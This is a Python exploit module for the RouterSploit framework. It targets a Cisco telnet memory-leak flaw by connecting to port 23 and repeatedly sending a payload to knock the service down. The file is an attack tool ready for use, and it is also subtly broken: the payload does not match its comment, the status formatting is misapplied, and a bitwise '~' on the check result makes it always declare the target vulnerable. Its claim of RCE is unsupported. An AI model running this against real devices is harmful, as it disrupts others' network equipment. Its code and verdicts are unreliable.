# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    mute,
    validators,
)

import struct
import time
import socket  # Broken PIPE?


class Exploit(exploits.Exploit):
    """
    Cisco Catalyst Software, telnet service with memory leak vulnerability..
    """
    __info__ = {
        'name': 'Cisco Catalyst Telnet Memory Leak Vulnerability',
        'description': ['Cisco Catalyst Telnet server contain a vulnerablity of telnet service \n'
                        'memory leak, It will cause device Deny of Services(DoS) and RCE. Attacker\n'
                        'can exploit this cause a device telnet service shutdown.'
                        ],
        'authors': [
            'BlackAngels team'  
        ],
        'references': [
            'http://www.securityfocus.com/bid/5976/info',
        ],
        'devices': [
            'Cisco IOS Software for 677/678 Router was compiled before 2004',
        ],
        'id': 'sf-5976-11',
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(23, 'Target port')  # default port

    times = exploits.Option(5, 'Sending packet with payload times')

    flag = 0

    # TODO: UNITEST - FUNC TEST - CASE 08 -- Exploit Test
    def run(self):
        dch = "AAA\n"

        # It's that possable?! 32*30000 = 960000 Bytes + 2Bytes SHC
        payload = dch

        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if sockfd:  # Connection up!
            try:
                sockfd.connect((self.target, self.port))
            except Exception:
                print_error("Failed open socket, service on target is dead")
                return False
            for i in range(0, self.times):
                self.flag += 1
                print_status("Sending Payload at %d times, 2 pkts. per send.") % i
                try:
                    sockfd.send(payload)
                    time.sleep(1)
                    sockfd.send(payload)
                    time.sleep(1)
                except Exception:
                    print_status("Send failed, target maybe unavailable")
                    break
            sockfd.close()
            print_status("Check target status...")
            if ~self.check():
                print_success("Target down, that is VULNERABLE!")
                return True
            if self.flag >= self.times:
                print_error("Target may not in suffer. Or you can try more times!")
                return False
            else:
                print_status("Cannot ensure target status, check in manual")
                return False
        else:
            #sockfd.close()
            print_error("Can not create socket!")
            return False

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 07 -- Check func test
        try:
            socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socketfd.connect((self.target, self.port))
            socketfd.close()
        except Exception:
            print_status("Cannot connect remote target!")
            return False

        return True
